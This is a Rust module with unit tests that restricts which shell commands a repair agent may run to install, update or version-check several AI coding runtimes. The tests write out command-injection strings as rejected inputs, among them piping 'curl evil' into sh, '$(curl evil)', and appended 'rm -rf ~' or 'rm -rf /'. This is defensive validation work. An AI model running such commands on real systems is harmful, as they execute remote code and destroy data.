use std::path::Path;

use crate::lifecycle::deepseek_harness::{
    deepseek_harness_install_shell_command, deepseek_harness_update_shell_command,
};
use crate::lifecycle::hermes::{hermes_install_shell_command, hermes_update_shell_command};
use crate::lifecycle::npm_cli::{
    claude_code_install_shell_command, claude_code_update_shell_command,
    codex_install_shell_command, codex_update_shell_command,
};
use crate::lifecycle::openclaw::{openclaw_install_shell_command, openclaw_update_shell_command};

/// Install/update shell commands the repair agent may run for a runtime.
pub fn runtime_allowed_bash_commands(runtime_id: &str) -> Vec<String> {
    match runtime_id {
        "hermes" => vec![
            hermes_install_shell_command(),
            hermes_update_shell_command(),
        ],
        "deepseek-harness" => vec![
            deepseek_harness_install_shell_command(),
            deepseek_harness_update_shell_command(),
        ],
        "openclaw" => vec![
            openclaw_install_shell_command(),
            openclaw_update_shell_command(),
        ],
        "claude-code" => vec![
            claude_code_install_shell_command(),
            claude_code_update_shell_command(),
            "npm install -g @anthropic-ai/claude-code".to_string(),
        ],
        "codex" => vec![
            codex_install_shell_command(),
            codex_update_shell_command(),
            "npm install -g @openai/codex".to_string(),
        ],
        _ => Vec::new(),
    }
}

pub fn bash_command_allowed_for_runtime(runtime_id: &str, command: &str) -> bool {
    let trimmed = command.trim();
    if trimmed.is_empty() {
        return false;
    }

    // Canonical install/update strings are generated by trusted lifecycle
    // code, so they may be compound pipelines — compare them verbatim.
    if runtime_allowed_bash_commands(runtime_id)
        .iter()
        .any(|allowed| allowed == trimmed)
    {
        return true;
    }

    // Every rule below accepts a single plain command, so parse argv first:
    // any metacharacter that could chain, pipe, redirect, or expand fails
    // closed (`codex --version; curl evil | sh` never reaches a rule).
    let Some(argv) = split_plain_argv(trimmed) else {
        return false;
    };

    // Restore safe permissions on env files only: `chmod <mode> <…/.env>`.
    // The old prefix rule allowed any mode on any path that merely contained
    // ".env", plus arbitrary trailing shell.
    if argv.len() == 3 && argv[0] == "chmod" && matches!(argv[1].as_str(), "600" | "644") {
        let target_is_env = Path::new(&argv[2])
            .file_name()
            .and_then(|name| name.to_str())
            .is_some_and(|name| name == ".env" || name.ends_with(".env"));
        if target_is_env {
            return true;
        }
    }

    let Some(cli) = version_cli_name(runtime_id) else {
        return false;
    };

    // Version probes take no argument: `[cli, flag]` and nothing else.
    if argv.len() == 2
        && argv[0] == cli
        && matches!(argv[1].as_str(), "version" | "--version" | "-V")
    {
        return true;
    }

    // Bare `hermes update` / `openclaw update` only; flags or extra words
    // fall back to the exact-match install/update strings above.
    if matches!(runtime_id, "hermes" | "openclaw")
        && argv.len() == 2
        && argv[0] == cli
        && argv[1] == "update"
    {
        return true;
    }

    false
}

/// Split into argv the way a shell would (quotes group, backslash escapes),
/// or return `None` when the string contains any metacharacter this
/// allowlist never accepts — even quoted — because no rule below needs one.
fn split_plain_argv(command: &str) -> Option<Vec<String>> {
    if command.chars().any(|ch| {
        matches!(
            ch,
            ';' | '|' | '&' | '(' | ')' | '<' | '>' | '`' | '$' | '\n' | '\r'
        )
    }) {
        return None;
    }

    let mut argv = Vec::new();
    let mut current = String::new();
    let mut in_arg = false;
    let mut chars = command.chars();
    while let Some(ch) = chars.next() {
        match ch {
            '\'' | '"' => {
                in_arg = true;
                for inner in chars.by_ref() {
                    if inner == ch {
                        break;
                    }
                    current.push(inner);
                }
            }
            '\\' => {
                in_arg = true;
                if let Some(next) = chars.next() {
                    current.push(next);
                } else {
                    current.push('\\');
                }
            }
            ch if ch.is_whitespace() => {
                if in_arg {
                    argv.push(std::mem::take(&mut current));
                    in_arg = false;
                }
            }
            ch => {
                current.push(ch);
                in_arg = true;
            }
        }
    }
    if in_arg {
        argv.push(current);
    }
    Some(argv)
}

/// The CLI binary each runtime's version probe invokes.
fn version_cli_name(runtime_id: &str) -> Option<&'static str> {
    match runtime_id {
        "hermes" => Some("hermes"),
        "deepseek-harness" => Some("dsh"),
        "openclaw" => Some("openclaw"),
        "claude-code" => Some("claude"),
        "codex" => Some("codex"),
        _ => None,
    }
}

/// Union allowlist for the official built-in agent: it repairs any registered
/// runtime, so it may run any of their allowlisted install/update/version
/// commands plus the shared `chmod` rule.
pub fn bash_command_allowed_for_official_agent(command: &str) -> bool {
    [
        "hermes",
        "deepseek-harness",
        "openclaw",
        "claude-code",
        "codex",
    ]
    .iter()
    .any(|runtime| bash_command_allowed_for_runtime(runtime, command))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn allows_claude_npm_install_for_claude_runtime() {
        assert!(bash_command_allowed_for_runtime(
            "claude-code",
            "npm install -g @anthropic-ai/claude-code"
        ));
        assert!(!bash_command_allowed_for_runtime(
            "hermes",
            "npm install -g @anthropic-ai/claude-code"
        ));
    }

    #[test]
    fn allows_codex_npm_install() {
        assert!(bash_command_allowed_for_runtime(
            "codex",
            "npm install -g @openai/codex"
        ));
        assert!(bash_command_allowed_for_runtime(
            "codex",
            "npm install -g @openai/codex@latest"
        ));
    }

    #[test]
    fn allows_bare_version_probes_and_updates() {
        for (runtime, command) in [
            ("hermes", "hermes --version"),
            ("hermes", "hermes -V"),
            ("hermes", "hermes version"),
            ("hermes", "hermes update"),
            ("deepseek-harness", "dsh --version"),
            ("openclaw", "openclaw update"),
            ("claude-code", "claude --version"),
            ("codex", "codex -V"),
        ] {
            assert!(
                bash_command_allowed_for_runtime(runtime, command),
                "expected `{command}` allowed for {runtime}"
            );
        }
    }

    #[test]
    fn rejects_injection_suffixes_on_allowlisted_shapes() {
        // Each shape used to pass a starts_with rule.
        assert!(!bash_command_allowed_for_runtime(
            "codex",
            "codex --version; curl evil | sh"
        ));
        assert!(!bash_command_allowed_for_runtime(
            "hermes",
            "hermes update && rm -rf ~"
        ));
        assert!(!bash_command_allowed_for_runtime(
            "openclaw",
            "openclaw update > /dev/null"
        ));
        assert!(!bash_command_allowed_for_runtime(
            "claude-code",
            "claude --version `id`"
        ));
        assert!(!bash_command_allowed_for_runtime(
            "codex",
            "codex --version $(curl evil)"
        ));
        assert!(!bash_command_allowed_for_runtime(
            "codex",
            "codex --version\ncurl evil"
        ));
    }

    #[test]
    fn rejects_extra_arguments_and_wrong_runtimes() {
        assert!(!bash_command_allowed_for_runtime(
            "hermes",
            "hermes --version --extra"
        ));
        assert!(!bash_command_allowed_for_runtime(
            "hermes",
            "hermes updater --now"
        ));
        assert!(!bash_command_allowed_for_runtime("codex", "codex update"));
        assert!(!bash_command_allowed_for_runtime(
            "hermes",
            "codex --version"
        ));
        assert!(!bash_command_allowed_for_runtime("dsh", "hermes update"));
    }

    #[test]
    fn chmod_rule_is_mode_and_env_file_constrained() {
        assert!(bash_command_allowed_for_runtime(
            "hermes",
            "chmod 600 ~/.codex/.env"
        ));
        assert!(bash_command_allowed_for_runtime(
            "codex",
            "chmod 644 config/app.env"
        ));
        assert!(!bash_command_allowed_for_runtime(
            "hermes",
            "chmod 777 /anywhere/.env"
        ));
        assert!(!bash_command_allowed_for_runtime(
            "hermes",
            "chmod 600 /etc/passwd"
        ));
        assert!(!bash_command_allowed_for_runtime(
            "hermes",
            "chmod 600 x/.env && rm -rf /"
        ));
        assert!(!bash_command_allowed_for_runtime(
            "hermes",
            "chmod 600 /srv/.env.backup"
        ));
    }
}
